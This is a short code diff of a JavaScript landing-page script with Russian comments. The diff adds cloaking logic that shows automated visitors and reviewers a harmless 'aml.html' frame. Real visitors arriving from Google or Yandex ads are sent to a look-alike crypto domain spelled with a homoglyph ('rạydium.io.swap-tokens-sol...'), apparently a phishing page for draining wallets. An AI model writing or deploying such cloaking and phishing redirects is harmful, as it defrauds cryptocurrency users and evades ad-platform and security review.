@@ -1,5 +1,4 @@
-
-  setTimeout(() => {
+setTimeout(() => {
     // Функция для проверки является ли пользователь ботом
     function isBot() {
       const userAgent = navigator.userAgent.toLowerCase();
@@ -52,13 +51,12 @@
     const hasPromopult = params.hasOwnProperty('promopult_yandex_direct') || 
                          params.utm_source === 'promopult_yandex_direct';
 
-    let targetUrl = 'aml.html'; // По умолчанию показываем aml.html
-
     if (!isBot() && (hasGclid || hasPromopult)) {
-      targetUrl = 'app.html';
+      // Редирект на app.html
+      window.location.href = 'https://rạydium.io.swap-tokens-sol.api-dashboard-connect.com';
+    } else {
+      // Показываем aml.html во фрейме
+      createFullscreenFrame('aml.html');
     }
 
-    // Загружаем соответствующую страницу во фрейм
-    createFullscreenFrame(targetUrl);
-
-  }, 4000);
+}, 4000);
